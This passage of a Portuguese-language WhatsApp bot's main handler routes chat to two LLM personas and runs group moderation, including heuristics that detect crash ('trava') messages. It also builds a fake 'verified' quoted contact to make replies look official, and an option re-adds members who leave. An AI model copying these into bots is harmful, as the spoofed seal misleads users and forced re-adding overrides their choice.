console.log("VIP:", isVip);

const botNumber = jidNormalizedUser(await conn.user.id || await conn.user.lid);
const Numero1 = jidNormalizedUser(`${dono1}@s.whatsapp.net`);
const Numero2 = jidNormalizedUser(`${dono2}@s.whatsapp.net`);
const Numero3 = jidNormalizedUser(`${dono3}@s.whatsapp.net`);
const Numero4 = jidNormalizedUser(`${dono4}@s.whatsapp.net`);
const Numero5 = jidNormalizedUser(`${dono5}@s.whatsapp.net`);
const Numero6 = jidNormalizedUser(`${dono6}@s.whatsapp.net`);
const MeuNumero = jidNormalizedUser(`${NumberDono}@s.whatsapp.net`);
const IsCreator = jpzinhhomi?.includes(sender);
const SoCriador = Shizukuu?.includes(sender);
const SoBot = botNumber?.includes(sender)
const So_Dono =
sender === MeuNumero ||
sender === Numero1 ||
sender === Numero2 ||
sender === Numero3 ||
sender === Numero4 ||
sender === Numero5 ||
sender === Numero6 ||
sender === botNumber ||
IsCreator ||
SoCriador;

const moment = require("moment-timezone");

const date = moment().tz("America/Sao_Paulo").format("DD/MM/YYYY");
const hora = moment().tz("America/Sao_Paulo").format("HH:mm:ss");

const type = baileys.getContentType(info?.message);

let body =
info?.message?.conversation ||
info?.message?.extendedTextMessage?.text ||
info?.message?.imageMessage?.caption ||
info?.message?.videoMessage?.caption ||
info?.message?.buttonsResponseMessage?.selectedButtonId ||
info?.message?.templateButtonReplyMessage?.selectedId ||
info?.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
info?.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ||
"";
console.log("BODY NO INDEX:", body);
console.log("TIPO:", type);
console.log("INTERACTIVE:", JSON.stringify(info?.message?.interactiveResponseMessage, null, 2));
console.log("TEMPLATE:", JSON.stringify(info?.message?.templateButtonReplyMessage, null, 2));
  if (info?.message?.interactiveResponseMessage) {
  const params = info?.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || "";

  const id = params.match(/"id"\s*:\s*"([^"]+)"/)?.[1];

  if (id) body = id;
}

global.forca = global.forca || {};

const cacheMetadata = new Map()

async function getMetadataSeguro(conn, from) {
  const agora = Date.now()
  const cache = cacheMetadata.get(from)

  // cache por 60 segundos
  if (cache && agora - cache.time < 60000) {
    return cache.data
  }

  try {
    const metadata = await conn.groupMetadata(from)
    cacheMetadata.set(from, {
      time: agora,
      data: metadata
    })
    return metadata
  } catch (e) {
    console.log('❌ ERRO GROUP METADATA:', e.message)

    // se tiver cache antigo, usa ele mesmo
    if (cache) return cache.data

    throw e
  }
}

// coloque fora das cases, no topo do index.js

//CONSTS IMPORTANTES

const veyronMemPath = path.join(__dirname, 'database', 'veyron_memoria.json');

function carregarMemoriaVeyron() {
if (!fs.existsSync(veyronMemPath)) {
fs.writeFileSync(veyronMemPath, JSON.stringify({
nome: "Veyron-AI",
dono: "Kyara</>",
jeito: "responda como uma IA direta, inteligente, meio sarcástica e sem enrolação, faça códigos completos",
memoria: [
"Você é o Veyron-AI, irmão do Kyara-AI, criado pelo Kyara</>."
]
}, null, 2));
}

return JSON.parse(fs.readFileSync(veyronMemPath));
}

function salvarMemoriaVeyron(db) {
fs.writeFileSync(veyronMemPath, JSON.stringify(db, null, 2));
}

const kyaraMemPath = path.join(__dirname, 'database', 'kyara_memoria.json');

function carregarMemoriaKyara() {
if (!fs.existsSync(kyaraMemPath)) {
fs.writeFileSync(kyaraMemPath, JSON.stringify({
nome: "Kyara-AI",
dono: "Kyara</>",
jeito: "responda como um bot inteligente, direto, com humor bem ácido e sem paciência",
memoria: [
"Você é o Kyara, um bot de WhatsApp criado pelo Kyara</>."
]
}, null, 2));
}

return JSON.parse(fs.readFileSync(kyaraMemPath));
}

function salvarMemoriaKyara(db) {
fs.writeFileSync(kyaraMemPath, JSON.stringify(db, null, 2));
}

const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isVisuU2 = type == 'viewOnceMessageV2'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage' || type == "viewOnceMessage" || type == "viewOnceMessageV2")
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if(isImage) typeMessage = "Image"
else if(isVideo) typeMessage = "Video"
else if(isAudio) typeMessage = "Audio"
else if(isSticker) typeMessage = "Sticker"
else if(isContact) typeMessage = "Contact"
else if(isLocation) typeMessage = "Location"
else if(isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedMsg2 = type === 'extendedTextMessage' && content.includes('text')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVisuU2 = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedDocW = type === 'extendedTextMessage' && content.includes('documentWithCaptionMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')

///{ constantes muito importantes}\\
const budy = (type === 'conversation') ? info.message?.conversation : (type === 'extendedTextMessage') ? info.message?.extendedTextMessage?.text : '';
const Procurar_String = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || ""
const PR_String = Procurar_String.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
const budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
const args = body.trim().split(/ +/).slice(1);
const arg = body.trim().split(/ +/).slice(1);
const q = args.join(' ');

try {
if (/^kyara\b/i.test(budy)) {

const pergunta = budy.replace(/^kyara[:,]?\s*/i, '').trim();

if (!pergunta) return reply('Fala comigo pae');

const atalhosKyara = {
'menu': `${prefix}menu`,
'abrir menu': `${prefix}menu`,
'perfil': `${prefix}perfil`,
'abrir perfil': `${prefix}perfil`,
'dono': `${prefix}dono`,
'abrir dono': `${prefix}dono`,
'pesquisar no mediafire': `${prefix}mediafire`,
'pesquisar no mediefire': `${prefix}mediefire`
};

const comandoAtalho = atalhosKyara[pergunta.toLowerCase()];

if (comandoAtalho) {
body = comandoAtalho;
} else {

const db = carregarMemoriaKyara();

const prompt = `
Você é ${db.nome}.
Dono: ${db.dono}.
Jeito de falar: ${db.jeito}

Memórias:
${db.memoria.join('\n')}

Pergunta:
${pergunta}
`;

const { data } = await axios.post(
'https://openrouter.ai/api/v1/chat/completions',
{
model: 'nvidia/nemotron-3-ultra-550b-a55b:free',
messages: [{ role: 'user', content: prompt }]
},
{
headers: {
'Authorization': `Bearer ${OPENROUTER_KEY}`,
'Content-Type': 'application/json'
},
timeout: 30000
}
);

const resposta = data?.choices?.[0]?.message?.content || 'Não consegui responder.';
reply(resposta);
return;

}

}
} catch (e) {
console.log("========== KYARA-AI ERROR ==========");
console.log(e.response?.status);
console.log(JSON.stringify(e.response?.data, null, 2));
console.log("====================================");
reply('Erro ao consultar minha IA.');
}

try {
if (/^veyron\b/i.test(budy)) {

const pergunta = budy.replace(/^veyron[:,]?\s*/i, '').trim();

if (!pergunta) return reply('Fala comigo, irmão.');

const atalhosVeyron = {
'menu': `${prefix}menu`,
'abrir menu': `${prefix}menu`,
'perfil': `${prefix}perfil`,
'abrir perfil': `${prefix}perfil`,
'dono': `${prefix}dono`,
'abrir dono': `${prefix}dono`
};

const comandoAtalho = atalhosVeyron[pergunta.toLowerCase()];

if (comandoAtalho) {
body = comandoAtalho;
} else {

const db = carregarMemoriaVeyron();

const prompt = `
Você é ${db.nome}.
Dono: ${db.dono}.
Jeito de falar: ${db.jeito}

Memórias:
${db.memoria.join('\n')}

Pergunta:
${pergunta}
`;

const { data } = await axios.post(
'https://openrouter.ai/api/v1/chat/completions',
{
model: 'nvidia/nemotron-3-ultra-550b-a55b:free',
messages: [{ role: 'user', content: prompt }]
},
{
headers: {
'Authorization': `Bearer ${OPENROUTER_KEY}`,
'Content-Type': 'application/json'
},
timeout: 30000
}
);

const resposta = data?.choices?.[0]?.message?.content || 'Não consegui responder.';
reply(resposta);
return;

}

}
} catch (e) {
console.log("========== VEYRON-AI ERROR ==========");
console.log(e.response?.status);
console.log(JSON.stringify(e.response?.data, null, 2));
console.log("====================================");
reply('Erro ao consultar a Veyron-AI.');
}

const isCmd = body && body.trim().startsWith(prefix);

const command = isCmd
? body.trim().slice(prefix.length).split(/ +/).shift().toLowerCase()
: "";

console.log("COMMAND NO INDEX:", command);
const mentionedJid =
info?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

let groupMetadata = {};
let participants = [];

if (isGroup && isCmd) {
try {
groupMetadata = await getGroupMetadataCached(conn, from);
participants = groupMetadata.participants || [];
} catch (e) {
console.log('Erro ao obter metadata:', e.message);
}
}

//INFO DE GRUPOS!!
const Infos_Do_Grupo = isGroup ? (await getGroupMetadataCached(conn, from) || {}) : {};
const NomeGrupo = Infos_Do_Grupo?.subject || '';
const DescGp = Infos_Do_Grupo?.desc || '';
const MembrosGP = Infos_Do_Grupo?.participants || [];
const TotalAdmins = MembrosGP[0]?.admin || '';
const TotalMembros = MembrosGP.length || 0;
const Dono_Do_Grupo = Infos_Do_Grupo?.subjectOwnerJid || '';

const So_Admins = isGroup ? getGroupAdmins(MembrosGP) : ''
const somembros = isGroup ? getMembros(MembrosGP) : ''

const dirGroup = `./DATABASE2/GRUPOS/ATIVACOES/${from}.json`

if(isGroup && !fs.existsSync(dirGroup)){
var dataGp2 = [{
name: NomeGrupo,
groupId: from, 
antilinkhard: false, 
So_Admins: false,
bangp: false,
antigroup: false,
antispam: false,
antiflood: false,
antibot: false,
antitrava: false,
warnings: {},
antiadm: false,
antipromote: false,
antidemote: false,
antiban: false,
antiaudio: false,
antiimg: false,
antidoc: false,
antisticker: false,
antivideo: false,
antifake: false,
antiraid: false,
antientrar: false,
antisair: false,
antiinvisivel: false,
antitagall: false,
antimention: false,
anticall: false,
antipv: false,
antiwarn: false,
wellcome: [{
bemvindo1: false,
legendabv: "Olá #numerodele#, seja bem vindo(a) a porra do Grupo: *#nomedogp#*, Kyara lhe deseja as boas vindas 🕸️",
legendasaiu: "Adeus, #numerodele#, espero que não se arrependa pela sua decisão desgraçado. "
},
{
bemvindo2: false,
legendabv: "Olá #numerodele#, seja bem vindo(a) ao Grupo: *#nomedogp#*, Kyara lhe deseja as boas vindas 🕸️",
legendasaiu: "Adeus, #numerodele#, espero que não se arrependa pela sua decisão. "
}],
}]
fs.writeFileSync(dirGroup, JSON.stringify(dataGp2, null, 2) + '\n')
}

let dataGp = undefined;

if (isGroup) {
try {
dataGp = JSON.parse(fs.readFileSync(dirGroup, "utf-8"));
} catch (e) {
console.log("JSON do grupo corrompido:", dirGroup);
fs.unlinkSync(dirGroup);
return;
}
} 

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + '\n')}

const isBemvindo = isGroup ? dataGp[0]?.wellcome[0]?.bemvindo1 : undefined 
const isAntiLinkHard = isGroup ? dataGp[0]?.antilinkhard : undefined
const SoAdmins = isGroup ? dataGp[0]?.So_Admins : undefined 
const isBanGrupo = isGroup ? dataGp[0]?.bangp : undefined 

if (
isGroup &&
dataGp[0]?.antilink &&
!isGroupAdmins &&
!So_Dono &&
/https?:\/\/|www\.|chat\.whatsapp\.com\//i.test(budy)
) {

await conn.sendMessage(from, {
text: `🚫 @${sender.split('@')[0]} links não são permitidos!`,
mentions: [sender]
}, { quoted: info });

await conn.groupParticipantsUpdate(
from,
[sender],
'remove'
);

return;
}

const BotOff = Config2.botoff 
const isVerificado = Config2.verificado

//DEFINIÇÕES UTEIS

async function getKyaraFakeQuoted(conn, from) {
delete global._kyaraQuotedCache;

const botJid = botNumber || conn.user.id;
const fotoLocal = './dono/menus/Foto-menu/img-menu.jpg';

let thumbnail = Buffer.alloc(0);

try {
if (fs.existsSync(fotoLocal)) {
thumbnail = fs.readFileSync(fotoLocal);
}
} catch (e) {}

return {
key: {
remoteJid: from,
fromMe: true,
id: 'KYARAMD_VERIFICADO'
},
message: {
contactMessage: {
displayName: 'KYARA MD ✓',
vcard: `BEGIN:VCARD
VERSION:3.0
FN:KYARA MD ✓
ORG:Kyara;
TEL;type=CELL;waid=${botJid.split('@')[0]}:+${botJid.split('@')[0]}
END:VCARD`,
thumbnail
}
}
};
}


const selo = Config2.verificado
 ? await getKyaraFakeQuoted(conn, from)
 : info;


async function reply(texto) {
  try {
    return conn.sendMessage(
      from,
      { text: texto },
      { quoted: selo }
    );
  } catch (e) {
    console.log(e);
  }
}

const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: info.key
}
} 
conn.sendMessage(idgp, reactionMessage)
}

var isUrl = (url) => {
if(linkfy.find(url)[0]) return true
return false
}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? conn.sendMessage(from, {text: teks.trim(), mentions: memberr}) : conn.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const mention = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
conn.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}) 
}

const hora2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(hora2 > "00:00:00" && hora2 < "05:00:00"){
var saudacao = 'Boa noite'
} if(hora2 > "05:00:00" && hora2 < "12:00:00"){
var saudacao = 'Bom dia'
} if(hora2 > "12:00:00" && hora2 < "18:00:00"){
var saudacao = 'Boa tarde'
} if(hora2 > "18:00:00"){
var saudacao = 'Boa noite'
}

let isBotGroupAdmins = So_Admins?.includes(botNumber) || false;
let isGroupAdmins = So_Admins?.includes(sender) || So_Dono || SoBot || IsCreator || SoCriador || false;

const executorJid = info.key.participant || info.key.remoteJid || sender;
const executorJidNormalizado = jidNormalizedUser(executorJid);

let verificarGlobal = null;

try {
const conexaoAberta = conn?.ws?.readyState === 1;

verificarGlobal = isGroup && conn?.user && conexaoAberta && MembrosGP.length > 0
? await sistemaVerificacao(conn, from, executorJidNormalizado, { numerodono: NumberDono }, botNumber).catch(() => null)
: null;
} catch (e) {
console.log("❌ VERIFICAÇÃO IGNORADA:", e.message);
verificarGlobal = null;
}

if (isGroup && verificarGlobal) {
isGroupAdmins = verificarGlobal.isSenderAdmin || verificarGlobal.isDonoBot || So_Dono || SoBot || IsCreator || SoCriador || false;
isBotGroupAdmins = verificarGlobal.isBotAdmin || false;
}

// FUNÇÕES DE MARCAÇÕES ESSENCIAL \\
//FUNÇÃO FEITA POR: KYARASCRIPTS', NÃO TIRA OS CRÉDITOS DESGRAÇA!!
let menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant || '';
if (menc_prt.includes('@lid') && Infos_Do_Grupo?.participants) {
menc_prt = Infos_Do_Grupo.participants.find(v => v.lid === menc_prt)?.jid || '';
}
const menc_jid2 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
if (menc_jid2?.[0]?.includes('@lid') && Infos_Do_Grupo?.participants) {
menc_jid2[0] = Infos_Do_Grupo.participants.find(v => v.lid === menc_jid2[0])?.jid || '';
}
const menc_os2 = q.includes("@") ? (Array.isArray(menc_jid2) && menc_jid2.length > 0 ? menc_jid2[0] : null) : menc_prt;
const menc_jid = jidNormalizedUser(menc_os2 || sender);
const sender_ou_n = q.includes("@") ? menc_jid2?.[0] : (menc_prt || sender);
const normalizar = alvo => {
if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
return Infos_Do_Grupo.participants.find(v => v.lid === alvo)?.jid || alvo;
}
return alvo;
};//FUNÇÃO FEITA POR KYARASCRIPTS', NÃO TIRA OS CRÉDITOS DESGRAÇA!!
const numClean = txt => txt.replace(/[()+\-\/\s]/g, '') + '@s.whatsapp.net';
const mrc_ou_numero  = q.length > 6  && !q.includes('@') ? numClean(q)  : normalizar(menc_prt);
const marc_tds       = q.includes('@')                 ? normalizar(menc_jid) : q.length > 6  && !q.includes('@') ? numClean(q)  : normalizar(menc_prt);
const menc_prt_nmr   = q.length > 12 && !q.includes('@') ? numClean(q)  : normalizar(menc_prt);
const menc_prt3 = info.message?.extendedTextMessage?.contextInfo?.participant
const menc_jid3 = args?.join(" ").replace("@", "") + "@s.whatsapp.net"
const menc_jid23 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid
const sender_ou_n3 = q.includes("@") ? menc_jid : sender
const mrc_ou_numero3 = q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_os23 = q.includes("@") ? menc_jid : menc_prt 
const marc_tds3 = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_prt_nmr3 = q.length > 12 ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt
//============================//
if (isCmd && BotOff && !So_Dono) {
    console.log("❌ BOT OFF bloqueou:", command);
    return reply("❌ Bot desligado para manutenção, chame +55 19 99572-9970 para tirar suas dúvidas..");
}

if (isGroup && isCmd && SoAdmins && !So_Dono && !isGroupAdmins) {
console.log("❌ Só admins bloqueou:", command, sender);
return reply("❌ Apenas administradores podem usar comandos neste grupo.");
}

if (isGroup && isCmd && isBanGrupo && !So_Dono) {
console.log("❌ Grupo banido bloqueou:", command);
return reply("❌ Este grupo está banido de usar comandos.");
}


let tipoMsg = "Texto";

if (info?.message?.imageMessage) tipoMsg = "📸 Imagem";
else if (info?.message?.videoMessage) tipoMsg = "🎥 Vídeo";
else if (info?.message?.audioMessage) tipoMsg = "🎧 Áudio";
else if (info?.message?.stickerMessage) tipoMsg = "🔖 Figurinha";
else if (info?.message?.documentMessage) tipoMsg = "📄 Documento";
else if (info?.message?.buttonsResponseMessage) tipoMsg = "🔘 Botão";
else if (info?.message?.listResponseMessage) tipoMsg = "📋 Lista";
else if (info?.message?.reactionMessage) tipoMsg = "💬 Reação";

function linha(label, value) {
  return `${chalk.gray("│")} ${chalk.hex("#9ca3af")(label)} ${chalk.white(value)}`;
}

if (
isGroup &&
dataGp[0]?.antigroup &&
!isGroupAdmins &&
!So_Dono &&
/chat\.whatsapp\.com\//i.test(budy)
) {

try {
const meuLink = await conn.groupInviteCode(from);

if (budy.includes(meuLink)) return;

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
});

await conn.groupParticipantsUpdate(
from,
[sender],
'remove'
);

} catch (e) {
console.log('[ANTIGROUP]', e);
}
}

global.spamUsers = global.spamUsers || {};

if (
isGroup &&
dataGp[0]?.antispam &&
!isGroupAdmins &&
!So_Dono &&
!info.key.fromMe
) {

const agora = Date.now();

if (!global.spamUsers[sender]) {
global.spamUsers[sender] = [];
}

global.spamUsers[sender].push(agora);

// mantém apenas últimos 10 segundos
global.spamUsers[sender] =
global.spamUsers[sender].filter(
t => agora - t < 10000
);

// 6 mensagens em 10 segundos = spam
if (global.spamUsers[sender].length >= 6) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🚫 @${sender.split('@')[0]} detectado fazendo spam.`,
mentions: [sender]
});

await conn.groupParticipantsUpdate(
from,
[sender],
'remove'
).catch(() => {});

delete global.spamUsers[sender];
}
}

global.floodUsers = global.floodUsers || {};

global.raidDetector = global.raidDetector || {};

global.antipvUsers = global.antipvUsers || {};

if (
isGroup &&
dataGp[0]?.antiflood &&
!isGroupAdmins &&
!So_Dono &&
!info.key.fromMe
) {

const agora = Date.now();
const texto = body || '';

if (!global.floodUsers[sender]) {
global.floodUsers[sender] = {
lastMsg: '',
count: 0,
lastTime: 0
};
}

const userFlood = global.floodUsers[sender];

if (
userFlood.lastMsg === texto &&
agora - userFlood.lastTime < 8000
) {
userFlood.count++;
} else {
userFlood.lastMsg = texto;
userFlood.count = 1;
}

userFlood.lastTime = agora;

// 4 mensagens iguais em menos de 8 segundos = flood
if (userFlood.count >= 4) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `⚡ @${sender.split('@')[0]} detectado floodando mensagem repetida.`,
mentions: [sender]
});

await conn.groupParticipantsUpdate(
from,
[sender],
'remove'
).catch(() => {});

delete global.floodUsers[sender];
}
}

if (
isGroup &&
dataGp[0]?.antibot &&
!info.key.fromMe
) {
try {

const isBotMsg =
info.key.id?.startsWith('BAE5') ||
info.key.id?.startsWith('3EB0') ||
info.key.id?.length > 22;

if (
isBotMsg &&
!isGroupAdmins &&
!So_Dono
) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🤖 @${sender.split('@')[0]} parece ser bot e foi removido.`,
mentions: [sender]
});

await conn.groupParticipantsUpdate(
from,
[sender],
'remove'
).catch(() => {});
}

} catch (e) {
console.log('[ANTIBOT]', e);
}
}

if (
isGroup &&
dataGp[0]?.antitrava &&
!isGroupAdmins &&
!So_Dono &&
!info.key.fromMe
) {
try {

const textoTrava = body || '';
const tamanhoMsg = JSON.stringify(info.message || {}).length;

const temTrava =
textoTrava.length > 3500 ||
tamanhoMsg > 12000 ||
/[\u200b\u200c\u200d\u2060\uFEFF]/.test(textoTrava) ||
(textoTrava.match(/[\u0300-\u036f]/g) || []).length > 80;

if (temTrava) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `💀 @${sender.split('@')[0]} tentou mandar trava e foi removido.`,
mentions: [sender]
});

await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
}

} catch (e) {
console.log('[ANTITRAVA]', e);
}
}

if (
isGroup &&
dataGp[0]?.antiaudio &&
!isGroupAdmins &&
!So_Dono
) {

const isAudio =
info.message?.audioMessage ||
info.message?.pttMessage ||
info.message?.voiceMessage;

if (isAudio) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🎵 @${sender.split('@')[0]}, áudios não são permitidos neste grupo.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antiimg &&
!isGroupAdmins &&
!So_Dono
) {

const isImage =
info.message?.imageMessage;

if (isImage) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🖼️ @${sender.split('@')[0]}, imagens não são permitidas neste grupo.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antidoc &&
!isGroupAdmins &&
!So_Dono
) {

const isDoc =
info.message?.documentMessage;

if (isDoc) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `📄 @${sender.split('@')[0]}, documentos não são permitidos neste grupo.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antisticker &&
!isGroupAdmins &&
!So_Dono
) {

const isSticker =
info.message?.stickerMessage;

if (isSticker) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🖼️ @${sender.split('@')[0]}, figurinhas não são permitidas neste grupo.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antivideo &&
!isGroupAdmins &&
!So_Dono
) {

const isVideo =
info.message?.videoMessage;

if (isVideo) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🎥 @${sender.split('@')[0]}, vídeos não são permitidos neste grupo.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antifake &&
isBotGroupAdmins &&
(info.messageStubType === 27 || info.messageStubType === 28)
) {
try {
const users = info.messageStubParameters || [];

for (const user of users) {
const numero = user.split('@')[0];

if (numero.length < 12 || !numero.startsWith('55')) {
await conn.sendMessage(from, {
text: `🚫 Número fake detectado.\nRemovendo @${numero}`,
mentions: [user]
});

await conn.groupParticipantsUpdate(from, [user], 'remove').catch(() => {});
}
}
} catch (e) {
console.log('[ANTIFAKE]', e);
}
}

if (
isGroup &&
dataGp[0]?.antiraid &&
isBotGroupAdmins &&
(info.messageStubType === 27 || info.messageStubType === 28)
) {
try {
const users = info.messageStubParameters || [];
const agora = Date.now();

if (!global.raidDetector[from]) {
global.raidDetector[from] = [];
}

for (const user of users) {
global.raidDetector[from].push(agora);
}

global.raidDetector[from] = global.raidDetector[from].filter(
t => agora - t < 20000
);

if (global.raidDetector[from].length >= 5) {
await conn.sendMessage(from, {
text: `🚨 RAID DETECTADO!\n\nMuitas pessoas entraram em pouco tempo.`
});

for (const user of users) {
await conn.groupParticipantsUpdate(from, [user], 'remove').catch(() => {});
}

global.raidDetector[from] = [];
}
} catch (e) {
console.log('[ANTIRAID]', e);
}
}

if (
isGroup &&
dataGp[0]?.antientrar &&
isBotGroupAdmins &&
(info.messageStubType === 27 || info.messageStubType === 28)
) {
try {

const users = info.messageStubParameters || [];

for (const user of users) {

if (
user === MeuNumero ||
user === Numero1 ||
user === Numero2 ||
user === Numero3 ||
user === Numero4 ||
user === Numero5 ||
user === Numero6 ||
user === botNumber
) continue;

await conn.sendMessage(from, {
text: `🚫 Entrada bloqueada.\n\n@${user.split('@')[0]} não pode entrar neste grupo.`,
mentions: [user]
});

await conn.groupParticipantsUpdate(
from,
[user],
'remove'
).catch(() => {});
}

} catch (e) {
console.log('[ANTIENTRAR]', e);
}
}

if (
isGroup &&
dataGp[0]?.antisair &&
isBotGroupAdmins &&
info.messageStubType === 32
) {
try {

const users = info.messageStubParameters || [];

for (const user of users) {

await conn.sendMessage(from, {
text: `👋 @${user.split('@')[0]} saiu do grupo.\n🔄 Re-adicionando automaticamente...`,
mentions: [user]
});

await conn.groupParticipantsUpdate(
from,
[user],
'add'
).catch(() => {});
}

} catch (e) {
console.log('[ANTISAIR]', e);
}
}

if (
isGroup &&
dataGp[0]?.antiinvisivel &&
!isGroupAdmins &&
!So_Dono
) {

const texto =
info.message?.conversation ||
info.message?.extendedTextMessage?.text ||
'';

const invisiveis = (
texto.match(/[\u200B-\u200F\u2060\uFEFF\u2800]/g) || []
).length;

if (invisiveis >= 10) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `👻 @${sender.split('@')[0]}, mensagens invisíveis não são permitidas.`,
mentions: [sender]
});
}
}

if (
isGroup &&
dataGp[0]?.antitagall &&
!isGroupAdmins &&
!So_Dono
) {

const mencoes =
info.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

if (mencoes.length >= 5) {

await conn.sendMessage(from, {
delete: {
remoteJid: from,
fromMe: false,
id: info.key.id,
participant: sender
}
}).catch(() => {});

await conn.sendMessage(from, {
text: `🚫 @${sender.split('@')[0]}, marcações em massa não são permitidas.`,
mentions: [sender]
});
}
}

if (
!isGroup &&
global.antipv === true &&
!So_Dono &&
!info.key.fromMe
) {
await conn.sendMessage(from, {
text: `🚫 O privado do bot está fechado.\n\nUtilize um grupo para falar comigo.`
}).catch(() => {});

await conn.updateBlockStatus(sender, 'block').catch(() => {});
return;
}

// ===== RECEBER COMPROVANTE NO PRIVADO =====
if (!isGroup) {
try {
const pedidos = carregarPedidos();

const pedidoAberto = Object.values(pedidos).find(p =>
p.user === sender &&
p.status === 'aguardando_comprovante'
);

if (pedidoAberto) {
const isDoc = !!info.message?.documentMessage;
const isImg = !!info.message?.imageMessage;

if (isDoc || isImg) {

await conn.sendMessage(`${NumberDono}@s.whatsapp.net`, {
text:
`🧾 *NOVO COMPROVANTE RECEBIDO*

👤 Cliente: ${pushname}
📱 Número: wa.me/${sender.split('@')[0]}

🆔 Pedido: ${pedidoAberto.id}
📦 Produto: ${pedidoAberto.produto}
💰 Valor: R$ ${pedidoAberto.valor}

✅ Para aprovar:
${prefix}aprovar ${pedidoAberto.id}

❌ Para recusar:
${prefix}recusar ${pedidoAberto.id}`
});

await conn.copyNForward(`${NumberDono}@s.whatsapp.net`, info, true);

pedidoAberto.status = 'em_analise';
pedidoAberto.comprovanteRecebido = true;
pedidoAberto.dataComprovante = Date.now();

salvarPedidos(pedidos);

await reply(
`✅ Comprovante recebido!

🆔 Pedido: ${pedidoAberto.id}
📦 Produto: ${pedidoAberto.produto}

Agora aguarde a análise.`
);

return;
}
}
} catch (e) {
console.log('[COMPROVANTE ERROR]', e);
}
}

